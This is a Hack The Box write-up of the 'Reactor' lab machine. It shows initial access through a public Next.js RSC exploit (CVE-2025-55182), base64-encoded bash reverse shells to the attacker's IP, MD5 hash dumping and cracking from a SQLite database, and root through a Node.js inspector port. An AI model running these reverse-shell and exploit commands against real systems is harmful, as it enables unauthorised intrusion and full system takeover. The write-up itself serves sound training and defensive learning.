# HTB Write-Up: Reactor

| Field      | Details          |
|------------|------------------|
| Platform   | Hack The Box     |
| Difficulty | Easy             |
| OS         | Linux            |
| Author     | shreekara        |
| Date       | May 24, 2026     |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Enumeration — ReactorWatch Dashboard & Version Fingerprinting](#2-enumeration--reactorwatch-dashboard--version-fingerprinting)
3. [Initial Access — CVE-2025-55182 (React2Shell RCE)](#3-initial-access--cve-2025-55182-react2shell-rce)
4. [Lateral Movement — SQLite Credential Extraction & Hash Cracking](#4-lateral-movement--sqlite-credential-extraction--hash-cracking)
5. [Privilege Escalation — Node.js Debug Port Hijacking](#5-privilege-escalation--nodejs-debug-port-hijacking)
6. [Summary & Takeaways](#6-summary--takeaways)

---

## 1. Reconnaissance

Starting with a full port scan to get an idea of what's exposed:

```bash
nmap -sC -sV -O -T4 10.129.6.0
```

Only two ports came back:
<img width="1900" height="886" alt="Screenshot 2026-05-29 145029" src="https://github.com/user-attachments/assets/10b448b0-1b81-4637-ae8b-ea66a82ea9fe" />

| Port | Service | Details                            |
|------|---------|------------------------------------|
| 22   | SSH     | OpenSSH 9.6p1 (Ubuntu)             |
| 3000 | HTTP    | Next.js — ReactorWatch application |

Pretty minimal attack surface. SSH is usually a dead end without creds, so port 3000 is where the focus needs to be.

---

## 2. Enumeration — ReactorWatch Dashboard & Version Fingerprinting

### 2.1 — Web Application Fingerprinting

Ran WhatWeb first to fingerprint the stack quickly:

```bash
whatweb 10.129.6.0:3000
```

```
http://10.129.6.0:3000 [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.129.6.0],
Script, Title[ReactorWatch | Core Monitoring System],
UncommonHeaders[x-nextjs-cache,x-nextjs-prerender,x-nextjs-stale-time],
X-Powered-By[Next.js]
```

The app is called **ReactorWatch** — a nuclear reactor core monitoring dashboard. More importantly, the `X-Powered-By` header and the Next.js-specific response headers confirm it's running **Next.js 15.0.3**. That version number is going to matter.

### 2.2 — Unauthenticated Dashboard

Navigating to `http://10.129.6.0:3000` — no login, no auth, nothing. The dashboard just loads and immediately starts leaking information:
<img width="1917" height="1018" alt="Screenshot 2026-05-29 145122" src="https://github.com/user-attachments/assets/f85e7fa0-b736-4d61-9b56-9ee5b95db75e" />

**Reactor telemetry (live, unauthenticated):**

| Panel          | Details                                      |
|----------------|----------------------------------------------|
| Core Status    | Reactor Power 98.2%, Criticality 1.0002 (WARNING) |
| Core Temp      | 324°C                                        |
| Pressure       | 155 bar                                      |
| Coolant Flow   | 18.4 k m³/h (CAUTION)                        |
| Turbine Output | 1.21 GW                                      |

**On-site personnel — also just... listed there:**

| Name                | Role                   | Status  |
|---------------------|------------------------|---------|
| Dr. Elena Rodriguez | Lead Nuclear Engineer  | ONLINE  |
| Marcus Kim          | Senior Technician      | ONLINE  |
| James Thompson      | Safety Officer         | OFFLINE |

Even if there was no direct exploit here, this is terrible from a security standpoint. Personnel names, roles, and live operational data — all public. Good recon material either way.

### 2.3 — Directory Enumeration

Threw Feroxbuster at it to find any hidden paths:

```bash
feroxbuster -u http://10.129.6.0:3000 -C 404 \
  --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
```

One oddity came up:

```
308  GET  http://10.129.6.0:3000/cgi-bin/ => http://10.129.6.0:3000/cgi-bin
```

A `/cgi-bin/` on a Next.js app doesn't make much sense — probably a red herring or misconfiguration. I noted it and moved on, since the more interesting angle was the framework version itself.

### 2.4 — CVE Research

A quick search on Next.js 15.0.3 turns up **CVE-2025-55182**, sometimes called **React2Shell**. It's a critical unauthenticated RCE via prototype pollution and unsafe deserialization in the React Server Components handler. The attack vector is injecting a malicious payload through the `Next-Action` header. No auth needed, which makes this very clean.

---

## 3. Initial Access — CVE-2025-55182 (React2Shell RCE)

### 3.1 — How the Vulnerability Works

The RSC handler in Next.js 15.0.3 doesn't properly sanitize the `Next-Action` header. By crafting a payload that exploits prototype pollution combined with unsafe deserialization, an attacker can get arbitrary OS command execution on the server. The service doesn't need to be authenticated — the vulnerable endpoint is reachable by anyone.

### 3.2 — Confirming RCE

Used a public Python PoC to verify execution before going for a shell:

```bash
python3 exploit.py --url http://10.129.6.0:3000 --cmd whoami
```

```
Success
node
```

```bash
python3 exploit.py --url http://10.129.6.0:3000 --cmd pwd
```

```
Success
/opt/reactor-app
```

We're running as `node` (uid=999) — low-privileged, but enough to start moving.

### 3.3 — Getting a Shell

Base64-encoded the reverse shell to avoid issues with quoting and special characters in the command argument:

```bash
echo 'bash -i >& /dev/tcp/10.10.16.194/9001 0>&1' | base64 -w 0
```

Set up the listener:

```bash
rlwrap nc -lnvp 9001
```

Fired the payload:

```bash
python3 exploit.py --url http://10.129.6.0:3000 \
  --cmd "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xOTQvOTAwMSAwPiYxCg== | base64 -d | bash"
```

Shell landed:

```
connect to [10.10.16.194] from (UNKNOWN) [10.129.6.0]
node@reactor:/opt/reactor-app$
```

---

## 4. Lateral Movement — SQLite Credential Extraction & Hash Cracking

### 4.1 — Poking Around the App Directory

First thing I do after getting a shell — enumerate the application files:

```bash
ls -la /opt/reactor-app
```

Two files immediately stood out:

| File         | Notes                                          |
|--------------|------------------------------------------------|
| `.env`       | Application environment configuration          |
| `reactor.db` | SQLite database — readable by the `node` user  |

An SQLite database sitting right in the app directory, readable by the current user. That's almost always going to have something useful.

### 4.2 — Dumping the Database

```bash
sqlite3 /opt/reactor-app/reactor.db
```

```sql
.tables
SELECT * FROM users;
```

```
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```

Two accounts with what look like MD5 hashes. MD5 is weak, so these should crack fast.

### 4.3 — Cracking the Hashes

Focused on the `engineer` hash since that account is more likely to have SSH access:

```bash
echo "39d97110eafe2a9a68639812cd271e8e" > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=Raw-MD5
```

```
reactor1         (?)
1g 0:00:00:00 DONE (2026-05-24 00:48) 50.00g/s 16857Kp/s
```

Cracked instantly. Credentials: **`engineer:reactor1`**

### 4.4 — SSH as Engineer

```bash
ssh engineer@10.129.6.0
```
<img width="1906" height="868" alt="Screenshot 2026-05-29 221205" src="https://github.com/user-attachments/assets/dea5bc70-cab7-4c6e-a05c-616ad92e997d" />

Logged in without any issues. User flag is at `/home/engineer/user.txt`.

---

## 5. Privilege Escalation — Node.js Debug Port Hijacking

### 5.1 — Checking Internal Services

With a proper shell as `engineer`, time to look for anything listening internally that wasn't visible from outside:

```bash
ss -tulnp
```

```
tcp  LISTEN  0  511  127.0.0.1:9229  0.0.0.0:*
```

Port **9229** on localhost — that's the standard Node.js V8 Inspector port. When a Node.js process is started with `--inspect`, it opens this port and allows anyone who can reach it to attach a debugger and run arbitrary JavaScript. If the process running it is privileged, that's a direct path to root.

### 5.2 — Identifying the Process

Checked `/opt/uptime-monitor/`:

```bash
cat /opt/uptime-monitor/worker.js
```

It's a Node.js uptime monitoring worker that pings the ReactorWatch app every 30 seconds. Crucially — it's running as **root** and was started with `--inspect`, which is why 9229 is open. Classic misconfiguration: a maintenance script that no one thought twice about running as root.

### 5.3 — Forwarding the Debug Port

The port is only accessible from localhost on the target, so I set up an SSH tunnel to reach it from my machine:

```bash
ssh -L 9229:127.0.0.1:9229 engineer@10.129.6.0
```

Now `127.0.0.1:9229` on my local machine maps directly to the Node.js debugger on the target.

### 5.4 — Connecting to the Debugger

```bash
node inspect 127.0.0.1:9229
```

```
connecting to 127.0.0.1:9229 ... ok
debug>
```

We're in.

### 5.5 — RCE as Root

`require` doesn't work directly in this context, but `process.mainModule.require` does — it reaches the module system through the already-loaded main module:

```javascript
exec("process.mainModule.require('child_process').execSync('id').toString()")
```

```
'uid=0(root) gid=0(root) groups=0(root)\n'
```

Running as root. From here, sending a root shell back:

```javascript
exec("process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.16.194/9002 0>&1\"').toString()")
```

Listener:

```bash
nc -lnvp 9002
```
<img width="521" height="591" alt="Screenshot 2026-05-29 224726" src="https://github.com/user-attachments/assets/c0a03b6f-05e3-4e06-a25e-960787a2ee63" />

```
connect to [10.10.16.194] from (UNKNOWN) [10.129.6.0]
root@reactor:~#
```

Root flag is at `/root/root.txt`.

<img width="884" height="552" alt="Screenshot 2026-05-29 222015" src="https://github.com/user-attachments/assets/65a0f348-8597-451a-bac4-50a3ec08afc6" />

---

## 6. Summary & Takeaways


### Attack Chain

| Phase                 | Technique                                                        | Result                          |
|-----------------------|------------------------------------------------------------------|---------------------------------|
| Recon                 | `nmap -A`                                                        | Ports 22, 3000 identified       |
| Fingerprinting        | WhatWeb + response headers                                       | Next.js 15.0.3 → CVE-2025-55182 |
| Initial Access        | React2Shell — `Next-Action` header injection                     | Shell as `node`                 |
| Credential Extraction | SQLite DB dump → MD5 hashes                                      | `engineer:reactor1`             |
| Hash Cracking         | John the Ripper + rockyou.txt                                    | Password cracked instantly      |
| Lateral Movement      | SSH with cracked credentials                                     | Shell as `engineer` + user flag |
| Privilege Escalation  | Node.js `--inspect` debug port → SSH tunnel → `process.mainModule.require` | Root shell + root flag |

### What I Took Away From This Box

**Don't expose dashboards without authentication, even "read-only" ones.** The unauthenticated ReactorWatch panel handed over personnel names and the full technology stack. That info directly led to the right CVE. Operational dashboards should always be behind auth.

**Version headers are free recon for attackers.** The `X-Powered-By: Next.js` header made version fingerprinting trivial. Stripping or obscuring those headers won't stop a determined attacker, but it removes the easy path.

**SQLite databases in app directories are credential goldmines.** If your web app ships with a database file that the service account can read, and that file contains password hashes, you've essentially left credentials in a place an attacker will look immediately. Secrets belong outside the web root with tight file permissions.

**`--inspect` on a root process is a root shell waiting to happen.** This is probably the most important lesson from this box. The Chrome DevTools Protocol gives full JavaScript execution inside the process — there's no sandboxing. Any Node.js service running as a privileged user with `--inspect` active, even bound to localhost, becomes a privilege escalation vector the moment someone gets a low-priv shell and can SSH-tunnel to it. Production services should never run with inspect flags enabled.
